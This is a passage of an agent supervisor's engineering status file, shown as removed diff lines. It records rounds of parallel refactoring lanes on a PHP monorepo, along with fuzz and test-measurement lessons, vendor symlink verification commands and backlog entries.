-rows). **Also demand the baseline's provenance:** lane c could not re-run at the base without a second
-vendor tree and correctly reported its baseline as *derived, not observed*.
-
-### 🔴 ROUND 43'S BEST FINDING — A LANE REFUTED ITS OWN DEFERRAL, AND THE FUZZ ALPHABET WAS THE REASON
-
-Lane `a`, its reviewer, and its own filed backlog entry all shared one premise: that a POSIX character
-class "routes to `legacyPathMatch()`" and is therefore "strictly no worse than before E85". **False.**
-The fallback runs only when the emitted regex fails to COMPILE. `[[:alpha:]]x` emits
-`#^[[:alpha:]\]x$#Ds`, which PCRE refuses — fine. But **a second bracket group supplies the missing
-`]`**: `[[:alpha:]][!a]` emits `#^[[:alpha:]\][^a]$#Ds`, which **compiles**, folds the second group into
-the first class, and answers false for `ab` where `fnmatch` answers true. **A silently wrong match with
-no fallback under it** — a correctness defect, not an unsupported-shape gap.
-
-**It was found by widening the differential fuzz's OWN alphabet** to include `[[:alpha:]]`; four seeds ×
-200,000 trials then reported 12–18 such narrowings where the old alphabet reported none. Fixed
-(`cf35074f`); the backlog entry was **superseded in place**, not deleted.
-
-🔴 **THE TRANSFERABLE RULE: THE FUZZ ALPHABET IS PART OF THE FUZZ'S COVERAGE, AND IT HAD BEEN WRITTEN TO
-MATCH THE CASES ALREADY KNOWN.** Same family as E69's "0 unexplained" over an alphabet containing no ZWJ.
-When a fuzz reports zero, ask what its alphabet cannot express before you believe it.
-
-### 🟢 E85 IS A LIVE, USER-VISIBLE BEHAVIOUR CHANGE — and it ships deliberately
-
-`SkillRegistry`'s three hand-rolled `str_replace` rewrites are gone, replaced by a real pattern→regex
-translation. **Supervisor-verified independently after the merge, not taken from the lane:**
-
-```
-**/*.php     vs foo.php       old fnmatch = 0   now = 1
-**/*Test.php vs FooTest.php   old fnmatch = 0   now = 1
-```
-
-**Three of the four shipped skills declare a leading-`**` pattern** — `php-best-practices` and
-`security-audit` (`**/*.php`) and `phpunit-master` (`**/*Test.php`) — and a leading `**` matched none of
-the three old rewrites, so those three **never fired on a tree-root file.** That is plainly what their
-authors intended, which is why it ships. **But nothing user-facing documents the change: that is E90.**
-
-### ⚠️ THINGS THAT CHANGE HOW YOU WORK — round 43's additions
-
-**A REVIEWER'S PHRASING IS NOT A MEASUREMENT EITHER.** Lane `c` propagated a reviewer's sentence — "there
-is no `strlen()` anywhere in `tests/`" — into two doc-blocks. `strlen()` appears in **66** files under
-`tests/`, and did at the base commit too. Rule 3 applies to prose you inherit, not only to figures you
-generate.
-
-**THE INSTRUMENT YOU BUILT TO CHECK THE REVIEW CAN CARRY THE DEFECT THE REVIEW IS ABOUT.** Lane `a`'s
-mutation runner appended a hard-coded `--filter` that silently overrode the one passed in, so every
-"hard-guard-only" row secretly ran both guards and the agent measured the wrong guard as red. Fixed
-harness reproduced the reviewer exactly. **Run your harness against a case whose answer you already know.**
-
-**A BENCHMARK'S UNTOUCHED CONTROL SIDE CAN MOVE 17% BETWEEN TAKES.** Only the *ratio* survived
-re-measurement; the absolute times were not quotable and the doc-block now says so. Three runs, always.
-
-**A PIN THAT DOES NOT EXIST MUST NOT BE CLAIMED.** Lane `b` had a mutation survive (moving an argv scan
-from `$argv[0]` to `$argv[1]` is unobservable, since PHP fills `$argv[0]` with the script path). It wrote
-that down in the comment rather than inventing a test or quietly dropping the alignment.
-
-**"A CALL THE CENSUS CANNOT READ MUST RED, NOT VANISH."** Lane `c`'s token-stream census records a
-non-literal argument as `<not a literal>` instead of skipping it. Any enumeration guard should fail
-loudly on what it cannot parse — a guard that silently ignores the unparseable is a guard with a hole
-shaped exactly like the next defect.
-
-**DO NOT TRUST A FROZEN `BEFORE` TABLE.** Lane `a`'s grid now re-derives all 2,484 `BEFORE` pairs from a
-local re-implementation of the old predicate, **because the cheapest way to make a narrowing disappear is
-to edit a `1` to a `0`.**
-
-### ✅ ROUND 43 CLOSED — merges `a45ec878` (a), `9581bdaa` (b), `628f50f1` (c)
-
-Run `wf_63a9dbf5-5e5`, 9 agents, 0 errors, ~97 min. Each lane a full-repo `cp -a` at `8416d98e`, verified
-clean with 18/18 in-lane symlinks before launch. **All three entered the fix stage again** — four rounds
-running, the review stage has caught real defects in every lane every time.
-
-🟢 **THE FILE SPLIT HELD.** Round 42's split leaked through `docs/SETTINGS.md`; this round it was assigned
-to one lane **by name in all three briefs**, and `git diff --name-only` per lane confirms the **only**
-shared file was the backlog. Zero code conflicts. Keep naming the contested file in every brief.
-
-- **Lane `a` — E85 + E87, +18 tests.** The globstar translation (above) plus the newline family
-  (`fnmatch('*.php', "a\nb.php")` is true on 8.3.6 and the translation said false — `/D` and `/s` are
-  independent and both load-bearing) and an **inverted "theorem"**: "never narrows" was justified by the
-  fallback, which a compiling pattern never consults, so it can neither rescue nor witness a narrowing.
-  Grid widened 42×50 → **46×54** so it can SEE all four families; 0 lost, 49 gained, all classified by
-  cause. E87 **decided**: `maxBytes()` 2,636 re-derived from constants, `smallestUnclippedCallerCap()`
-  21,088, margins 3.11× (Grep/Glob) and 49.72× (Read).
-- **Lane `b` — E86 + E84, +32 tests.** The MCP notice now reaches the transcript seam **in addition to**
-  `error_log()`, because the existing justification was partly sound (it is the only seam a test can
-  observe). Its new comment's mechanism was then found **inverted** and re-measured. E84 **closed a
-  family**: three argv shapes made the broken checkout emit JSON where the working one refuses; the guard
-  now models `--` and ArgvParser's two value-consumption flavours, and the agreement is asserted by a
-  17-row differential table rather than restated in prose.
-- **Lane `c` — E81 + E82 + E83 + E89, +32 tests.** Census moved onto the token stream; `GlobFigureDriftTest`
-  is the generator the prose claimed to have. **It caught an inverted claim of its own the reviewer
-  missed** (`merge()` "takes them lowest-first" — the signature is highest-first; the comment had read the
-  `array_merge()` *inside* the method and described the parameter list with it) **and it refuted its
-  reviewer correctly** (`warnPermissionConfig()` DOES append the full stop; the reviewer had inspected the
-  transcript seam, which carries neither affix).
-
-### 🔴 THE BACKLOG IS NOW 105 ENTRIES — E90–E111 ARE NEW
-
-E90–E93 (lane a) · **E94–E98 (lane b, renumbered from its own E90–E94 at merge** — both lanes appended
-from the same base and collided; check the numbering before citing a round-43 entry) · **E99–E111 filed
-by the supervisor from the three reports**, because thirteen findings would otherwise have lived only in
-agent transcripts.
-
-**Start the next round with these:**
-- 🔴 **E103** — `Bootstrap::reportProjectTierToolRemovals()` still spells the stale glob length.
-  ⚠️ **Fixing it WILL red `GlobFigureDriftTest`, by design**, and `docs/SETTINGS.md`'s "is the one
-  remaining site" sentence must move in the SAME commit. A three-part rewrite, not a number swap.
-- 🔴 **E94 + E98** — `README.md` has **four** spots E84 falsified, not the two originally filed.
-- **E106** — a one-line `/model` omission in `Chat::withOnConfigChange()`'s doc-block, the identical shape
-  to E81, one file over, with a pinning pattern already written to copy.
-- **E90** — document E85's behaviour change for users (see above; it is already shipped).
-- **E95, E96, E102** — test-hygiene: one unowned stderr line, a `/tmp`-globbing test, child-process fan-out.
-
-Then the carried queue: **E59's real-worker half** (needs an autoloader in the child, a provider identity
-in the startup message, and an offline CI substitute), **E61's L** (fiber/fork for an unbounded all-PHP
-hook chain — do not let "E61 is done" close it), **E79**, **E77**, **E80** (the flake), **E88**
-(`SelectPaneMsg` wiring — behavioural, needs its own item), `keybindings` (L, DEFER — see E110 for the
-canonical-machine-id prerequisite), then **Phase 9** (interactive-prompt containment), then the deferred
-security pass.
-
-### 🔴 E80 IS STILL A REAL FLAKE AND DID NOT FIRE THIS ROUND EITHER
-
-`MultiAgentRefactorTest::testArchitectPlansTwoCodersImplementInParallelReviewerVerifiesLeadMerges` —
-`pcntl_fork()` + SQLite `flock()` with a **capped** backoff. **If a full-suite run comes back rc 1 with
-exactly one risky test and ~22 missing assertions, this is it — re-run before diagnosing anything else.**
-
-### VENDOR / DEPENDENCY STATE — unchanged since round 42, and still correct
-
-53 libs linked, 0 mixed, 0 published; root `composer.lock` updated and committed (`2d78013d`);
-`sugar-crush` deliberately held at its round-42 third-party versions so the floor stays comparable —
-**when they are refreshed, re-measure the floor in the same commit and say so here.**
-
-🟢 **PUBLISHED MODE IS NO LONGER BLOCKED — MASTER WAS PUSHED MID-ROUND, BY THE USER, NOT BY ME.**
-`origin/master` advanced to `7f76a855` with reflog `update by push` while round 43's docs were being
-written; no git hooks are installed on this box (`.git/hooks/` holds only samples), so that was a human.
-Everything through the three lane merges and the E99–E111 backlog commit is now public. Only the last
-few doc commits trail.
-
-**So the next round can finally run `php scripts/refresh-deps.php` in its DEFAULT `--mode=published`** —
-give `sync-sugarcraft.yml` and the Packagist webhook time to run first, then the script's own
-post-condition (fingerprinting every vendored sibling's `src/` against the working tree) tells you
-whether the pipeline actually caught up. ⚠️ **Keep `sugar-crush` LINKED regardless** — published mode
-moves its skip count 1 → 2 and voids every floor comparison in this file. The script warns by name.
-
-⚠️ Pushing remains outward-facing and is still **not** something to do unilaterally. This entry records
-that it happened, not a licence to repeat it.
-
-### CONCURRENCY IS **3**, BY EXPLICIT USER INSTRUCTION
-
-Unchanged. `docs/plans/crush_code_concurrency.md` is the authority for the mechanics; its arithmetic says
-sustainable N = 3, hard cap 4. A read-only scout does not count against the budget.
-⚠️ **P8.8 and P8.13 still collide with each other** — never bundle those two.
-
-### LANE HYGIENE — round 43's dirs and branches are GONE, and the verification order matters
-
-`/home/sites/crush-lane-{a,b,c}` removed and `drain43-{a,b,c}` deleted — **but only after** confirming
-per lane that every file in the lane's diff is byte-identical in master to the lane HEAD, and that
-`git branch --merged master` listed all of them. Round 42's `drain-{a,b,c}` were deleted at the same time
-for the same reason. Do it in that order; a lane dir removed before the check is unrecoverable.
-
----
-
-## SUPERSEDED — round 42's block, kept for its reasoning (its floor 8996 is superseded by §0-NOW-56; its rules are NOT)
-
-**SUITE FLOOR: `8996 / 105179 / 1 skipped / rc 0` at `c204015e`**, supervisor-measured in the live tree
-after merging all three round-42 lanes (04:12.080). Supersedes every earlier figure (8978 held the
-round-41 boundary, 8905 round 40). `sugar-crush` was **linked** for this measurement — see the
-published/linked note below, because a published-mode tree reports a different skip count and is not
-comparable. **Skips MUST stay exactly 1**: confirmed still `tests/MCP/McpClientTest.php` by running
-that file alone (40 tests, 1 skipped), and the closure canary
-`GitignoreAwarenessTest::testTheMonorepoPathRepoSymlinksAreNotFollowed` was run by name and **PASSED
-rather than skipping**. 18/18 symlinks in `sugar-crush/vendor/sugarcraft/`;
-`md5sum .sugar-crush/config.json` = `05480c743aff302fd6c06c5a4a4c2210`;
-`php tools/check-path-repos.php --no-lib-path-repos` rc 0; zero tracked per-lib `composer.lock`.
-
-🔴 **THE MERGED-TOTAL PREDICTION MISSED BY 2, AND THE MISS WAS THE POINT.** Predicted 8994 from the
-lanes' reported deltas (a +5, b +7, c +4); discovery announced **8996**. Not a bad merge — a **stale
-figure in lane `b`'s report**. Counting `^+ *public function test` in each lane's diff gives 5 / **9** /
-4 = 18, and 8978 + 18 = 8996 exactly. Lane `b` measured 8985 correctly after its *implement* stage, then
-its *fix* stage added two more tests (`44902256`, `44124fea`) and the figure table was never re-measured.
-**NEW WORKING RULE: a lane's figures must be re-measured AFTER its fix stage, not carried forward from
-implement.** Put it in the brief. The cheap cross-check that found it in one command:
-`git diff <base>..HEAD -- 'sugar-crush/tests/**' | grep -c '^+ *public function test'` — do this per
-lane BEFORE merging and reconcile it against the reported delta.
-
-### 🔴 CORRECTION, ROUND 42 — THE `candy-buffer` "1,621 -> 1,661" PROOF WAS NOISE. Do not cite it again.
-
-Round 41 recorded that `candy-buffer`'s assertion count moved **1,621 -> 1,661** the moment it tested
-the real `candy-core`, and used that +40 as the measure of how blind the stale run had been. **That
-figure cannot support the claim.** Measured 2026-08-22 on one identical, clean, correctly-linked tree
-(4/4 symlinks, vendored `Width.php` md5 `270fc3f2...` = live), three consecutive full runs of
-`candy-buffer`:
-
-```
-274 tests, 1569 assertions
-274 tests, 1545 assertions
-274 tests, 1507 assertions
-```
-
-Spread **62**, comfortably larger than the +40 that was treated as signal. The source is
-`candy-buffer/tests/BufferTest.php`, which uses `rand()`/`mt_rand()`/`random_int()`; that one file alone
-measured **1246** then **1098** assertions on consecutive runs. **`candy-buffer`'s assertion count is
-not a measurement of anything and must never be used as a closure signal.** Its *test* count (274) is
-stable and is the only figure of its worth quoting.
-
-🟢 **THE CONCLUSION SURVIVES; ONLY THE EVIDENCE DIED.** `check-path-repos.php --fix --strict-closure`
-really does inject **zero** path repos for `candy-buffer` — verified this round directly, by running
-`--fix --strict-closure` and then reading the manifest (`injected repositories:` empty) rather than by
-inferring it from a suite total. Its only sibling dep, `sugarcraft/candy-core`, sits in `require-dev`,
-and `--fix`'s injection path does not read that section (the checker's validation and `--unused` paths
-do). `scripts/refresh-deps.php` computes its own closure for exactly this reason.
-
-**The transferable rule, which this plan already had and did not apply:** *a figure without its
-generator is not a measurement.* A single before/after pair from a suite with a randomised test is a
-coin flip with a decimal point on it. Run it three times before you call a delta signal.
-
-### 🔴 READ THIS BEFORE YOU TRUST ANY SUITE FIGURE — the closure can be gone and the suite still says OK
-
-**A `composer install` or `composer update` ANYWHERE in this monorepo replaces `vendor/sugarcraft/*`
-symlinks with Packagist copies.** The suite then still passes, still prints a total, and is **no longer
-testing the working tree**. It happened live this round: the user ran `composer update` in several dirs
-mid-round and **two consecutive full-suite runs were void** — they exercised sugar-crush against a
-Packagist `candy-core`, so the E52 fix under test was not loaded at all. All fourteen sibling
-verifications were void with them.
-
-**THE TELL IS THE SKIP COUNT — 1 → 2 — AND THIS ROUND IS THE FIRST TIME IT ACTUALLY FIRED.** The second
-skip is `GitignoreAwarenessTest::testTheMonorepoPathRepoSymlinksAreNotFollowed`, reason *"no path-repo
-symlinks in this checkout"*: a test whose whole job is walking the link farm, so it skips exactly when
-the farm is gone. The invariant this file has carried for many rounds was right.
-
-⚠️ **DO NOT SETTLE THIS WITH `ls`.** `ls -l … | grep -c '^l'` printed **18** on two separate checks
-while PHP's `is_link()` returned false for every entry and `ls -la` showed `drwxrwxr-x candy-ansi`.
-The measurements that cannot lie:
-```sh
-php -r 'foreach (glob("sugar-crush/vendor/sugarcraft/*") as $p) { printf("%s %d\n", basename($p), (int) is_link($p)); }'
-php -r 'echo file_get_contents("sugar-crush/vendor/sugarcraft/candy-core/src/InputReader.php")
-      === file_get_contents("candy-core/src/InputReader.php") ? "SAME\n" : "PACKAGIST COPY\n";'
-```
-**Restore recipe (measured):** `php tools/check-path-repos.php --fix --strict-closure` → `composer
-update` in each affected lib → `git checkout -- '*/composer.json'` (NEVER commit those) →
-`php tools/check-path-repos.php --no-lib-path-repos` must exit 0 → **re-measure everything taken since
-the update.** ⚠️ `--fix --strict-closure` walks `require`, not `require-dev`, so `candy-testing`
-(and `candy-vcr` under `sugar-dash`) legitimately stay Packagist copies in eight libs. That is what CI
-does too. `sugar-crush` itself must be **18 of 18**. Do not "fix" the residue.
-
-🔴 **NEW, ROUND 41 — "the closure is intact" IS A PER-LIB FACT, NOT A REPO-WIDE ONE, AND THE SIBLING
-SWEEP IS WHERE IT BITES.** After the closure was restored for `sugar-crush` (18/18, verified), **nine
-sibling libs still had `vendor/sugarcraft/candy-core` as a stale Packagist copy** — candy-buffer,
-candy-async, candy-testing, candy-mouse, candy-input, honey-bounce, candy-zone, candy-shell,
-candy-shine. All nine reported **rc 0 and said nothing at all** about the `candy-core` change they were
-supposed to be verifying: their vendored `Width.php` was md5 `f2a3558f…` / 33,275 B against the
-worktree's `270fc3f2…` / 38,125 B. Only 4 of 16 libs in that sweep were real signal, and the sweep
-would have been reported as a clean pass.
-
-**So: verify the sibling closure BY CONTENT, per lib, before believing a sibling sweep.** The skip-count
-alarm is a `sugar-crush` alarm — it does not exist in the siblings, which have no equivalent canary.
-```sh
-LIVE=$(md5sum candy-core/src/Util/Width.php | cut -d' ' -f1)
-for d in <libs>; do p=$d/vendor/sugarcraft/candy-core
-  printf "%-16s link=%s match=%s\n" "$d" "$(php -r "echo (int) is_link('$p');")" \
-    "$([ "$(md5sum $p/src/Util/Width.php | cut -d' ' -f1)" = "$LIVE" ] && echo yes || echo NO)"; done
-```
-⚠️ **`--fix --strict-closure` walks `require` ONLY, so a `require-dev` sibling dep is never injected and
-`composer update` will NOT fix it.** `candy-buffer` carries `sugarcraft/candy-core` in **`require-dev`**
-and stayed a Packagist copy through the whole round-trip. The fix is a hand-injected scratch
-`repositories[]` for that one lib, `composer update`, then `git checkout -- <lib>/composer.json` —
-same discipline, done by hand:
-```sh
-cp candy-buffer/composer.json /tmp/<unique>.bak      # scratch, exact-path
-php -r '$f="candy-buffer/composer.json"; $j=json_decode(file_get_contents($f),true);
-  $j["repositories"]=[]; foreach(["candy-core","candy-ansi","candy-input","candy-pty"] as $d)
-  $j["repositories"][]=["type"=>"path","url"=>"../$d","options"=>["symlink"=>true]];
-  file_put_contents($f, json_encode($j, JSON_PRETTY_PRINT|JSON_UNESCAPED_SLASHES)."\n");'
-(cd candy-buffer && composer update --quiet) && git checkout -- candy-buffer/composer.json
-```
-**`candy-buffer`'s assertion count moved 1,621 → 1,661 the moment it tested the real `candy-core`.**
-That +40 is the measure of how blind the stale run was — same test files, different vendored dependency.
-🔴 **NEW, ROUND 42 — A CONTENT PROBE ON THE WRONG FILE REPORTS `SAME` WITH THE CLOSURE ENTIRELY GONE.**
-The user ran `composer update` in `sugar-crush` again mid-round-42. Measured state: **`symlinks=0/18`** —
-the closure was completely absent — yet a content probe on `candy-sprinkles/src/Style.php` printed
-**`SAME`**, because round 41 changed only `StyleTest.php`, never `Style.php`. An unchanged file is
-byte-identical in the Packagist copy *by construction*, so it can never detect staleness.
-**`is_link()` is the PRIMARY check and cannot be fooled; the content probe is the SECONDARY one, and it
-is only meaningful on a file the round actually changed.** Pick the probe file out of the round's own
-diff (`git diff --name-only <base>..HEAD -- '<dep>/src/'`), never from habit. Here the honest probe was
-`candy-core/src/Util/Width.php`: vendored `f2a3558f…` against the live `270fc3f2…`.
-**Restore was the standard round-trip and it worked cleanly** (`--fix --strict-closure` → 396 issues
-fixed across 58 libs → `composer update` in `sugar-crush` → `git checkout -- '*/composer.json'` →
-rc 0 / 18 of 18 / 0 escaping / all four round-41 files `SAME`). ✅ **Third-party drift was ZERO** —
-`sugar-crush/composer.lock` resolves the same versions as the round-42 lane copies, verified package by
-package, so the lanes' deltas remain comparable to a live-tree measurement. **Check that whenever the
-user updates mid-round**: a third-party bump between the lanes and the live tree would silently break
-the merged-total prediction.
-
-🔴 **NEVER commit that `repositories[]` block** (hard fatal in a split-repo clone);
-`php tools/check-path-repos.php --no-lib-path-repos` must exit 0 before you commit.
-
-### 🟢 VENDOR STATE AS OF ROUND 42's CLOSE — EVERY LIB IS LINKED, AND THE ROOT UPDATE IS DONE
-
-- **Root `composer update -v -o -W` ran and is COMMITTED** as `2d78013d` — 118 insertions / 115
-  deletions, aws-sdk 3.390.4 -> 3.393.4 and friends, byte-identical in shape to the change round 41
-  wrongly reverted. The debt to the user is paid. The root lock is TRACKED and belongs in git; do not
-  `git checkout --` it the way you would a lib manifest.
-- **`php scripts/refresh-deps.php --mode=linked` ran over all 57 non-`sugar-crush` libs**: 0 failures,
-  **53 linked / 0 published / 0 mixed** (it was 12 linked / 12 mixed / 30 fully-Packagist before),
-  guard rc 0, zero tracked per-lib locks, working tree clean afterwards.
-- **`sugar-crush` was deliberately EXCLUDED** from that refresh so the floor measured minutes earlier
-  at `c204015e` stays comparable. It remains 18/18 linked. When its third-party deps are eventually
-  refreshed, **re-measure the floor in the same commit** and say so in this file.
-- **Sibling sweep against the live `candy-core`, all rc 0** — candy-core 799/7210/25skip,
-  candy-sprinkles 751/2629, candy-buffer 274/(unstable, see the correction above), candy-async 69/141,
-  candy-testing 129/230/1skip, candy-mouse 121/269, candy-input 276/40696/1skip, honey-bounce 193/5571,
-  candy-zone 120/339, candy-shell 333/691, candy-shine 339/667/1warn, candy-forms 1823/2973,
-  sugar-bits 493/1015, sugar-charts 543/1259, candy-kit 143/486, candy-pty 606/1476/1warn/16skip,
-  candy-vt 598/2355, candy-vcr 743/3432/14skip. **This is the first sweep in which the 30 previously
-  Packagist-only libs were actually testing the working tree.** The tail of the sweep list
-  (candy-mosaic, candy-palette, candy-query, sugar-dash, sugar-table, candy-files, candy-flip) was
-  still running at write-up; re-run it if you need those.
-
-⚠️ **PUBLISHED MODE IS CURRENTLY BLOCKED, CORRECTLY.** `scripts/refresh-deps.php` (default
-`--mode=published`) refuses while commits are unpushed, and there are ~24. That guard is the whole
-point: Packagist cannot serve what has not been pushed. Push, let `sync-sugarcraft.yml` and the
-Packagist webhook run, then a published-mode pass verifies what an outside consumer actually gets.
-
-### CONCURRENCY IS **3**, BY EXPLICIT USER INSTRUCTION — the round-40 cap is LIFTED
-
-Given 2026-08-22: *"continue with concurrency of 3 and us agents with workflows"*. The round-40
-standing instruction (*"no more spawning additional agents until session resets"*) is **superseded and
-must not be re-applied**. `docs/plans/crush_code_concurrency.md` stays the authority for the mechanics;
-its own arithmetic says sustainable N = 3, hard cap 4. A read-only scout does not count against the
-budget. ⚠️ **P8.8 and P8.13 still collide with each other** — never bundle those two.
-
-### WHAT LANDED FIRST IN ROUND 41 — `ae30fee5`, supervisor-verified by my own full-suite run (the three lanes came after; see below)
-
-- **E52 — the modifier merge.** `candy-core`'s `;<mod>` rebuild REPLACED the whole `KeyMsg` from the
-  parameter, discarding any flag the key table's own arm had set. ⚠️ **The backlog named only
-  `CSI 1;5Z`; it is the whole shift-bit-clear family** — `1;3Z` (alt), `1;5Z` (ctrl), `1;7Z` (ctrl+alt)
-  all decoded unshifted — so a fix scoped to `1;5` would have been wrong, and a mutation proves it. The
-  rebuild now ORs, which is a no-op for every other arm.
-- **E61 (the S only) — the refusal named the one lever that could not move the outcome.** The
-  chain-expiry deny named the budget's sum while the hook holding it had consumed none of it; the clock
-  was spent by an unbounded hand-written hook the message never named. It now names the spenders, marks
-  each as counted-in-the-sum or not, states elapsed next to budgeted, and says outright that raising a
-  `timeout:` will not help. 🔴 **E61's L STAYS OPEN** — a fiber or a fork for an unbounded all-PHP
-  chain. Do not let "E61 is done" close it.
-
-### ⚠️ THINGS THAT CHANGE HOW YOU WORK — carried forward (round 41 adds three more, further down)
-
-**NEW — NEVER ADD A SKIPPED TEST TO CLOSE A TIMING-DEPENDENT BRANCH.** E61's all-bounded branch is
-reachable only via per-hook `proc_open` overhead: four hooks each declaring 10ms **denied on some runs
-and fitted on others**. The first cut called `markTestSkipped()` on the fitted case — which would have
-put a second skip in the suite whose skip count is the closure alarm above. It is now pinned with a
-`BoundedHookInterface` double. **A coin flip dressed as an assertion is worse than a test double.**
-
-**NEW — VERIFY A REACHABILITY CLAIM BEFORE YOU WRITE IT INTO A COMMENT.** A first draft of E61's fix
-asserted `timeout: 0` reaches the no-hook-ran branch. It does not — `ScriptHook::timeoutSeconds()` reads
-zero as *unset* and answers its 60-second default. The real route is a **positive sub-microsecond**
-timeout. Same family as E68: a mechanism written down with confidence and inverted in fact.
-
-**E68 PROVES THE VERSION AXIS IS REAL. Put a PHP version on every width claim.** E68's recorded
-mechanism was **inverted**, and its prescribed fix would have changed nothing: `Width::string()` was the
-splitter, because `grapheme_str_split()` is **PHP 8.4+ and absent on this box's 8.3.6**. It was a
-**PHP-8.3-only defect recorded as unconditional**, and CI runs `PHP_VERSIONS = ['8.3', '8.4']` — so a
-lane can measure green here and go red in CI. **This box has only PHP 8.3.6.** Use ext-intl's
-`grapheme_extract()`/`grapheme_strlen()` as an ICU oracle; prefer fixes that REMOVE a version-conditional
-path over fixes that pick a branch.
-
-**A hypothesis in a status block reads, one round later, exactly like a measurement.** Mark hypotheses
-as hypotheses in this file.
-
-**Rewrite a stale justification; never delete it.** WHAT IT SAID / WHAT IS TRUE NOW / WHY THIS STILL
-EARNS ITS PLACE. Delete the reasoning and the next reader deletes the guard.
-
-**Keep the `/tmp` prohibition in EVERY brief:** never glob-delete `/tmp/sc_chat_tool_*` or
-`/tmp/crush-hook-payload-*`; unique probe names, exact-path deletes only. **Agents commit INCREMENTALLY
-in-lane.** **Cite SYMBOLS, not line numbers** — round 40 produced a fifth instance inside the lane that
-had just been told about the pattern.
-
-**A green suite is not a pinned invariant. Mutate the clause, or you have not pinned it.**
-
-### ✅ ROUND 41'S THREE LANES ALL LANDED — `8e01450e` (b), `61c073f8` (c), `7852d79e` (a)
-
-Run `wf_0ae3956d-f31`, 9 agents, 0 errors, ~93 min wall clock. Each lane was a full-repo `cp -a` copy at
-`ae30fee5` running implement → adversarial review → fix. **All three entered the fix stage** (3, 5 and
-several blocking/major findings respectively) — the review stage is not ceremony, it caught real defects
-in all three lanes including two the lane's own commit message had asserted as measured.
-**Merged with zero conflicts**, because the split was chosen so no two lanes open the same file.
-
-- **Lane `a` — `statusLine`, greenfield, +61 tests.** User-tier-only (in `LAYERED_KEYS`, deliberately
-  NOT in `PROJECT_TIER_KEYS`), so a project-tier `statusLine` is dropped before the merge — the RCE-on-
-  clone-and-launch shape is closed by construction. Bounded by `TIMEOUT_SECONDS = REFRESH_SECONDS / 2.0`
-  — **derived, so overlap is impossible rather than merely unlikely**. Sanitised through
-  `Sanitize::untrusted()` **plus a whitespace collapse** (that function preserves LF/CR/TAB, and one LF
-  makes the last frame line two physical rows) **plus `Renderer::untrusted()`'s zone-sentinel strip**,
-  which is the half no brief mentioned and the one that matters: U+E000/U+E001 would otherwise reach
-  `scanRoot()` on the single row that already carries a real `pane:menu` zone. Width via
-  `Width::truncate()` (grapheme-wise), measured after the scroll readout so the segment is genuinely
-  lowest-priority. **18 mutations, 18 killed — but M13 SURVIVED the first pass**: the sentinel test
-  sliced from `strpos('hijacked')` onward, and the sentinels sit *before* that offset, so the assertion
-  was true of the unstripped bar too. Rewritten to count the bar's own sentinels. ⚠️ **The census count
-  in both briefs was wrong**: a new `src/*.php` moves **four** figures in `BuiltInToolCorpusTest` plus
-  **`src/Context/RepoMapBlock.php`'s prose restatement, which that test reads back** — a non-test file.
-- **Lane `b` — E73, `candy-core`.** The recorded Step ("make the look-ahead refuse to absorb a Control")
-  was **too narrow**: the whole ZWJ machine had **inverted semantics** post-E68, so it was removed rather
-  than repaired. Supervisor-verified independently before merge (`TAB ZWJ 👍` 0 → 6; real ZWJ family
-  unchanged at 2). ⚠️ **The first commit's fuzz figures were not reproducible** — no generator, no seed,
-  no length bound — and the review corrected them to 461 over-runs / 1,669 under-runs at `ae30fee5`,
-  0 / 1,670 after. The over-run family (the frame-corrupting direction) is closed outright.
-  It also **unbroke a red CI job**: `candy-core` ships `phpstan.neon` at level 5 and the removal
-  orphaned `Width::isEmoji()`. Kept and documented as a seam with a measured reason NOT to wire it.
-- **Lane `c` — E70 + E71 + E72.** All three premises held, but **a sub-claim inside E70 was itself
-  wrong**: `forPaths()` marks only entries it EMITS, so an unaffordable nudge is DEFERRED, not retired —
-  the old test's failure message asserted the opposite of the truth. Every threshold is now derived from
-  `SkillPathNudge`'s pricing at runtime rather than written down. ⚠️ **A comment the lane wrote in its
-  own first commit ("Grep's `+1` is an over-reservation") was falsified by its own review**: dropping the
-  `+1` makes cap 3,037 return 3,038 bytes. 8 mutations, 8 killed.
-
-**Six new backlog entries, E74–E79** — E74 (a live user-facing **security misstatement** in
-`sugar-crush/README.md`: it promises that a project-tier `disabledTools` must name what it removes, and
-`LayeredSettings.php` records the eight-character counterexample `{"disabledTools":["[!B]*"]}` that
-leaves only `Bash`) · E75 (README calls `config.json` deprecated; the source argues at length it is not)
-· E76 (`Chat.php`'s pane-click docblock says the `App`/`Tui\Renderer` system is constructed by nothing;
-`bin/sugarcrush:225` constructs it) · E77 (`nextCluster()`'s no-ext-intl fallback is now wrong for real
-ZWJ — latent, `ext-intl` is hard-required) · E78 (nothing ties `Bootstrap`'s shipped tool caps to the
-nudge floor, so a future cap below ~1,400 silently reopens E70) · E79 (the tab/Extend under-run family
-is a rendering-semantics decision with foundation-wide blast radius, not a bug).
-
-**Lane dirs `/home/sites/crush-lane-{a,b,c}` were removed only after the merges were verified applied.**
-Branches `drain-a`/`drain-b`/`drain-c` remain in the live repo as the recoverable record.
-
-### ⚠️ NEW WORKING RULES FROM ROUND 41
-
-**A FIGURE WITHOUT ITS GENERATOR IS NOT A MEASUREMENT.** Lane `b` shipped `989 / 3,862` in a commit
-message, reproducible from nothing, and its own review could not re-derive them. Every fuzz figure must
-carry its seed, its alphabet, its length bound, its trial count, and the PHP/ICU version. This is the
-same defect class as E69's "0 unexplained" over an alphabet containing no ZWJ.
-
-**A MUTATION CAN SURVIVE BECAUSE THE ASSERTION LOOKS IN THE WRONG PLACE.** Lane `a`'s M13 survived
-against a slice taken from the offset *after* the thing being asserted about. When a mutation survives,
-suspect the assertion's WINDOW before you suspect the mutation's relevance.
-
-**LET THE LANE'S REVIEW STAGE FIND ITS OWN LANE'S DEFECTS.** The supervisor independently spotted
-lane `b`'s orphaned `isEmoji()` while the lane was still running — and the lane's review found it too,
-diagnosed the red phpstan job the supervisor had missed, and justified not-wiring it with an ICU
-measurement. **Do not pre-empt a review stage that has not finished.**
-
-### ✅ ROUND 42 CLOSED — `98589858` (a), `878c5fdf` (b), `c204015e` (c)
-
-Run `wf_062ad75c-a27`, 9 agents, 0 errors, ~71 min. Each lane a full-repo `cp -a` at `a6cb8f4d`,
-implement → adversarial review → fix. **All three entered the fix stage again** (a: 3 blocking/major,
-b: 2, c: 4) — three rounds running, the review stage has caught real defects in every lane.
-Lanes `a` and `b` merged with zero conflicts; lane `c` conflicted **only** in the backlog, where all
-three had appended stamps — both sides kept, markers removed.
-
-⚠️ **The no-two-lanes-share-a-file split LEAKED this round.** `sugar-crush/docs/SETTINGS.md` was
-assigned to lane `a` and lane `b` edited it too. It merged clean because they hit different sections
